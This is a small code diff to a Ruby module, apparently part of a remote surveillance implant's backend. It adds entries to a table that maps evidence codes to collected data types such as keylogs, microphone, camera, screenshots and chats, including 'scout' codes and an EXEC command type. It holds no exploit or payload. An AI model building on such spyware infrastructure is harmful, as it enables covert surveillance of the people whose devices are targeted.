@@ -4,11 +4,13 @@ require 'rcs-common'
 module RCS
 
 EVIDENCE_TYPES = { 0x0240 => :DEVICE,
+                   0xFFF1 => :DEVICE,       # for scout
                    0x0140 => :CALL,
                    0x0230 => :CALLLIST,
                    0xC2C2 => :MIC,
                    0x0241 => :INFO,
                    0xB9B9 => :SCREENSHOT,
+                   0xFFF2 => :SCREENSHOT,   # for scout
                    0x0040 => :KEYLOG,
                    0xE9E9 => :CAMERA,
                    0xC6C6 => :CHAT,
@@ -35,7 +37,8 @@ EVIDENCE_TYPES = { 0x0240 => :DEVICE,
                    0x0250 => :IADDRESSBOOK,
                    0x0201 => :CALENDAR,
                    0x0202 => :TASK,
-                   0xc0c0 => :COMMAND}        #missing
+                   0xc0c0 => :COMMAND,
+                   0xc0c1 => :EXEC}
 
 class EvidenceDeserializeError < StandardError
   attr_reader :msg
